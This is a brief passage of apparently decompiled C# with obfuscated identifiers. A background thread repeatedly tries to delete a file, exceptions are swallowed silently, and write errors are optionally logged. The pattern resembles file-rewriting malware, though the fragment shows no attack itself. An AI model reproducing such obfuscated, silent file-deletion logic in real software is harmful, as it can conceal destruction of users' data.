							if (File.Exists(qeNqTsZYZbMASjf))
							{
								File.Delete(qeNqTsZYZbMASjf);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (nOaztTOGmlogd)
			{
				try
				{
					File.AppendAllText(zRTqZqtXid, "File: " + MZjyNDaBBAUd + " - Error while fully writing to file: " + ex2.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
